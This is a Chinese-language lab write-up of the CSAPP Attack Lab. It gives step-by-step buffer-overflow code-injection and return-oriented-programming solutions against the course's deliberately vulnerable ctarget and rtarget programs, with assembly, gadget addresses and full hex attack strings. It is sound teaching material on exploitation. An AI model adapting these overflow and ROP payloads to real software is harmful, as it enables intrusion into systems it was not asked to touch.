# CSAPP实验记录（三）：Attack lab

这个lab涉及到对分别有不同安全漏洞的两个程序进行总共5次攻击。从这个lab中我们将了解到当程序不能很好地保护自己免受缓冲区溢出时，攻击者可以利用安全漏洞的不同方式。我们将学习到如何写出更安全的程序、如何使用GDB和OBJDUMP等工具。

objdump是在类Unix操作系统上显示关于目标文件的各种信息的命令行程序。我们可以使用objdump命令对目标文件(obj)或可执行文件进行反汇编，它以一种可阅读的格式让你更多的了解二进制文件可能带有的附加信息。

从官网下载handout，在虚拟机中解压，得到六个文件：

- `README.txt`: A file describing the contents of the directory 
- `ctarget`: An executable program vulnerable to code-injection attacks 
- `rtarget`: An executable program vulnerable to return-oriented-programming attacks 
- `cookie.txt`: An 8-digit hex code that you will use as a unique identifier in your attacks. 
- `farm.c`: The source code of your target’s “gadget farm,” which you will use in generating return-oriented programming attacks. 
- `hex2raw`: A utility to generate attack strings. 由于我们需要将攻击的代码编译成机器码，再将机器码转换成对应的ASCII码，再转换成字符串输入。所以我们的机器码中通常会包含对应无法打印在屏幕上的字符的ASCII码，这个程序就是帮助我们生成这些无法打印的字符的。

`ctarget` 和 `rtarget` 都会从标准输入中读取字符串，然后保存在一个大小为 `BUFFER_SIZE` 的 char 数组中（具体的大小每个人的程序都不大一样）。

如果输入的字符串太短，getbuf( )函数会返回1。如果输入字符串超过了缓冲区的长度，会导致访问一个未知的空间，就会出现`segementation fault`。

运行ctarget出现 `FAILED: Initialization error: Running on an illegal host `错误：自学的同学加上-q参数，不发送结果到评分服务器。

<img src="https://raw.githubusercontent.com/BoL0150/image2/master/image-20210721150236456.png" alt="image-20210721150236456" style="zoom:80%;" />

- `-h`: Print list of possible command line arguments 

- `-q`: Don’t send results to the grading server 
- `-i FILE`: Supply input from a file, rather than from standard input

## ctarget_phase1

这一关中我们暂时还不需要注入新的代码，只需要让程序重定向调用某个方法就好。`ctarget` 的正常流程是

```c
unsigned getbuf(){
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
void test() {
    int val;
    val = getbuf();
    printf("NO explit. Getbuf returned 0x%x\n", val);
}
```

我们要做的是调用程序中的另一个函数

```c
void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

也就是在 `getbuf()` 函数返回的时候，执行 `touch1()` 而不是返回 `test()`。

所以我们需要输入一个字符串，造成缓冲区溢出，将getbuf栈帧上面的test的返回地址覆盖为touch1的地址，将函数定向到touch1。

我们先来看一下缓冲区的大小。使用gdb将`getbuf`反汇编

![image-20210721180035455](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210721180035455.png)

可以看到`getbuf`一开始分配了0x28（40）字节的空间作为缓冲区。

我们再来看一下touch1的地址。同样，使用gdb将 `touch1`反汇编

![image-20210721180157704](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210721180157704.png)

可以看出，`touch1`的返回地址是`0x00000000004017c0`，所以答案就是是40个任意字符 + `0x00000000004017c0`

Intel机器为小端，即低位在低地址。所以填充后的栈组织为：

<img src="https://raw.githubusercontent.com/BoL0150/image2/master/image-20210721205708892.png" alt="image-20210721205708892" style="zoom:50%;" />

输入内容为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

上面是我们最终填充到栈中的可执行的字节码，但是我们输入的是字符串，程序会将字符串转换成对应的ASCII码后，再存放在栈中。所以我们需要将上面的字节码转换成对应的ASCII码中的字符，再输入。

![image-20210721210628757](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210721210628757.png)

## ctarget_phase2

第二关中需要插入一小段代码，`ctarget` 中的 `touch2` 函数的 C 语言如下：

```c
void touch2(unsigned val){
    vlevel = 2;
    if (val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

根据代码就可以看出来，我们需要把自己的 cookie 作为参数传进去，这里需要把参数放到 `%rdi` 中，只使用 `ret` 来进行跳转。

也就是说，我们需要插入一段代码，这段代码将cookie放到`%rdi`中，还要将`touch2`函数的地址push到栈中。所以`getbuf`结束后，会先跳转到我们插入的代码，插入的代码结束后ret（将栈顶的值，也就是刚刚push的`touch2`的地址，pop到`%rip`中），再跳转到`touch2` 。

1. 首先是查找`touch2`的地址：

   <img src="https://raw.githubusercontent.com/BoL0150/image2/master/image-20210721224652272.png" alt="image-20210721224652272" style="zoom: 67%;" />

   `0x00000000004017ec`即为`touch2` 第一条指令的地址

2. 然后再查出缓冲区的开始位置，也就是`getbuf`中`%rsp`所在的位置。所以我们必须要对源程序进行调试。

   1. 想要显示源代码，首先在`getbuf`函数处打断点，再执行程序。

      ```
      info break		显示所有断点的信息
      break getbuf 	在getbuf函数处打断点
      ```

      ![image-20210721233444751](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210721233444751.png)

   2. 输出%rsp的值

      ![image-20210722092848540](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210722092848540.png)

3. 我们此时就可以写注入的代码了：

   ```assembly
   mov $0x59b997fa,%edi
   pushq $0x00000000004017ec
   ret
   ```

   由于这个过程中没有使用栈保存寄存器或局部变量，ret不需要增加%rsp的值，直接将栈顶的值pop到%rip中，程序跳转到`touch2`。

4. 将上面的汇编代码保存为`p2.s`，使用`gcc -c p2.s`将它编译为字节码文件`p2.o`，再使用 `objdump -d p2.o`检查它的反汇编代码。

   ![image-20210722091137259](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210722091137259.png)

5. 所以我们要注入的可执行机器码为

   ```
   bf fa 97 b9 59 68 ec 17 40 00 c3
   ```

   一共11个字节，缓冲区的大小为40个字节，还需填充29个字节，最后还需要加上缓冲区的起始地址 `0x5561dc78`

   所以我们最终的输入的字节码为：

   ```
   bf fa 97 b9 59 68 ec 17
   40 00 c3 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00
   ```
   
   将上面的字节码转换为字符串再输入。
   
   ![image-20210722093044939](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210722093044939.png)

## ctarget_phase3

第三阶段，也是需要在输入的字符串中注入一段代码。第二阶段注入的代码是以数字的形式给touch2传cookie，而这个阶段注入的代码是以字符串的形式给touch3传cookie（也就是传入一个地址，这个地址指向一个字符串）。

```c
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
    vlevel = 3;
    if (hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

可以看到，在touch3中还调用了一个函数，用来比较传入的字符串与cookie是否相同。`hexmatch`先将输入的16进制的cookie转换成10进制，再转换成16进制的字符串形式，最终是以16进制的字符串形式进行比较。

所以注入的代码需要做的是，将`"59b997fa"`转换成ASCII码的十六进制形式（注意，在C语言中字符串是以\0结尾，所以在字符串序列的结尾是一个字节0），存在某一个地址中。再将该地址赋给%rdi，再将touch3的地址入栈。

对于传进去字符串的位置，如果放在`getbuf`栈中，因为：

```cpp
char *s = cbuf + random() % 100;
sprintf(s, "%.8x", val);
```

`s`的位置是随机的，所以之前留在`getbuf`中的数据，则有可能被`hexmatch`的s所覆盖，所以放在`getbuf`中并不安全。我选择把字符串放在test栈帧中的return address的上面。

1. 进入getbuf函数，打印出%rsp的值为 `0x5561dca0`，所以字符串的位置就是 `0x5561dca8`。

   <img src="https://raw.githubusercontent.com/BoL0150/image2/master/image-20210722120217195.png" alt="image-20210722120217195" style="zoom: 50%;" />

2. 使用`man ascii`命令，可以得到`cookie`的字符串的16进制数表示：

   ```
   35 39 62 39 39 37 66 61
   ```

3. 再获取`touch3`的地址为 `0x00000000004018fa`：

   <img src="https://raw.githubusercontent.com/BoL0150/image2/master/image-20210722121122897.png" alt="image-20210722121122897" style="zoom: 67%;" />

4. 再获取缓冲区的地址为 `0x5561dc78`，覆盖test的返回地址：

   ![image-20210722122213805](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210722122213805.png)

5. 所以我们注入的代码为：

   ```assembly
   movq $0x5561dca8,%rdi
   pushq $0x4018fa
   ret
   ```

   将上面的汇编代码保存为`p3.s`，使用`gcc -c p3.s`将它编译为字节码文件`p3.o`，再使用 `objdump -d p3.o`检查它的反汇编代码。

   <img src="https://raw.githubusercontent.com/BoL0150/image2/master/image-20210722121726814.png" alt="image-20210722121726814" style="zoom:67%;" />

所以我们注入可执行的机器码为：

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

其中最后一行，最左边是字符串的起始地址，所以最左边是最高位。

![image-20210722124119586](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210722124119586.png)

字符串和数字（或者其他的任何东西）在机器中都是用二进制表示的，决定它的意义的是它在高级语言中的翻译方式。比如字符串是先将它翻译成对应的ASCII码，再将ASCII码变成二进制存储在内存中。对于内存中的这一串二进制，在c语言中，如果使用%s输出，那么就是将它翻译为字符串（二进制ASCII码转换成对应的字符）。如果使用%d输出，那么就是一串数字。

## ROP

除了缓冲区溢出，还有另一种攻击的方式，称为返回导向编程。

在栈随机化、栈的不可执行属性以及canary三种技术中，唯独不能破解canary。ROP就是用来破解前两种技术的。

返回导向编程（ROP）可以利用修改已有的代码，来绕过系统和编译器的保护机制，攻击者**控制堆栈调用以劫持程序控制流**并执行针对性的**机器语言指令序列（称为Gadgets）**。**每一段 gadget 通常结束于 return 指令（编码为c3）**，并位于共享库代码中的子程序。

栈随机化和栈不可执行使得攻击者难以预测缓冲区的位置以及难以插入代码，插入了也无法执行。ROP的策略就是：我无法知道栈在哪里，但是可以知道全局变量和代码在哪，可以使用机器中已经存在的**可执行**代码，重新组合成我们想要的结果。此方法无法破解canary。

从Gadget构造程序的条件：

- 一系列以ret结尾的指令
- 每次运行程序，代码的位置都是固定的
- 代码是可执行的

<img src="https://raw.githubusercontent.com/BoL0150/image2/master/image-20210716111006650.png" alt="image-20210716111006650" style="zoom:67%;" />

使用机器中已经存在的**可执行**代码（Gadget），重新组合成我们想要的结果。将这些Gadget的地址按照执行的顺序逆序压入栈中，每个Gadget由ret结尾，所以每个Gadget执行结束后，ret指令让栈顶的值pop到%rip中，就可以顺着执行栈中的下一条Gadget。

<img src="https://raw.githubusercontent.com/BoL0150/image2/master/14554587074206.jpg" alt="img" style="zoom: 80%;" />

**示例**

```c
void setval_210(unsigned *p)
{
  *p = 3347663060U;
}
```

对于上述代码，进行反汇编我们可以得到如下的执行序列，从中我们一个得到一个有趣指令序列:

```assembly
0000000000400f15 <setval_210>:
  400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
  400f1b: c3 retq
```

其中，字节序列`48 89 c7`是对指令`movq %rax, %rdi`的编码，就这样我们可以利用已经存在的程序，从中提取出特定的指令,执行特定的功能，地址为`0x400f18`，其功能是将`%rax`的内容移到`%rdi`。

我们的 `RTARGET` 代码包含许多类似于上面显示的 `setval_210` 函数的函数，位于我们称为gadget farm的区域。 我们的工作就是在gadget farm中识别有用的gadget，并使用它们来执行类似于在阶段 2 和 3 中所做的攻击。gadget farm由 `rtarget` 副本中的函数 `start_farm` 和 `end_farm` 划分。 不要尝试从程序代码的其他部分构建gadget。

##  Level 2

这个阶段我们需要重复之前第二阶段的工作。

第二阶段我们需要在缓冲区中注入代码，覆盖getbuf函数的返回地址，从而使得getbuf结束后执行我们注入的代码，将cookie移入%rdi中，然后再跳转到touch2 。但是在本阶段中，栈中的内容是不可执行的，所以我们需要借助机器中现有的程序，也就是使用gadget farm中的gadget。

这里我们只需要利用下表给出的指令类型，以及前八个寄存器(`%rax - %rdi`)。我们也只需要使用farm.c中的`start_farm` 到`mid_farm`部分，两条gadget。

![img](https://raw.githubusercontent.com/BoL0150/image2/master/1433829-d6312f1ce53cf044.png)

![img](https://raw.githubusercontent.com/BoL0150/image2/master/1433829-2a663eb32fae331a.png)

![img](https://raw.githubusercontent.com/BoL0150/image2/master/1433829-c713c395456655fa.png)

![img](https://raw.githubusercontent.com/BoL0150/image2/master/14554593790251.jpg)

我们要做的就是三步：

1. 把cookie放入%rdi中
2. 把touch2的地址放入栈中
3. ret

由上表可知，我们可以利用的`mov`指令中没有立即数，所以我们只能使用`popq`指令将cookie送到%rdi中。那么我就需要将cookie输入到栈中，再`popq`到`%rdi`中。同理，我们无法使用push指令，所以我们也只能将touch2的地址输入到栈中，当gadget结束后，touch2的地址pop到%rip中。

经writeup提示，本题需要使用两个gadget，所以需要先将cookie pop到某一个其他的寄存器，再mov到%rdi。

所以我们的栈的结构为：

```
touch2的入口地址（gadget2执行完后，ret会将这里的值pop到%rip中）
-----------------------------
gadget2的地址（movq %rax,%rdi）
-----------------------------
cookie的值（gadget1会将这里的值pop到%rdi中）
-----------------------------
gadget1的地址（popq %rax）(旧的返回地址会被这里覆盖)
------上面是test的栈帧---------
------下面是getbuf的栈帧-------
....
buf (缓冲区，随便写什么，反正不会被执行)
-----------------------------
```

每一个进程独享一个虚拟内存空间，一个可执行文件就是一个进程。要想进行rop攻击，选用的代码段必须与被攻击的程序在同一个虚拟内存空间中才行，所以farm实际上是rtarget的一部分，这里的farm.c只是单列出来方便我们查看可以用来攻击的指令。

我们先来查看farm的汇编代码。先把`farm.c`编译，然后用`objdump -d`输出汇编代码。

> 注意编译的时候一定要加-Og选项！不然会用到stack frame pointer， 而rtarget里函数是没有用到栈针指针的，这会导致指令的编码错误。

```bash
bolee@bolee-virtual-machine:~/csapp/target1$ gcc -c -Og farm.c
bolee@bolee-virtual-machine:~/csapp/target1$ objdump -d farm.o > farm.s
```

打开`farm.s` 就可以看到我们的反汇编编码序列：

<img src="https://raw.githubusercontent.com/BoL0150/image2/master/image-20210722191232506.png" alt="image-20210722191232506" style="zoom: 67%;" />

首先找gadget2的代码，由writeup提供的表可知，需要寻找`48 89 xx c3`的指令序列。

![image-20210725162412403](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210725162412403.png)

再寻找gadget1的代码，也就是 `58 c3`的指令序列

![image-20210725163653892](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210725163653892.png)

在rtarget的gdb中查看这两个函数的汇编代码：

![image-20210725170618034](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210725170618034.png)

从中我们可以得出`movq %rax,%rdi`指令的地址为：`0x4019a2`，`popq %rax`指令的地址为：`0x4019ab`

所以输入的字节码为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

![image-20210725171820856](https://raw.githubusercontent.com/BoL0150/image2/master/image-20210725171820856.png)

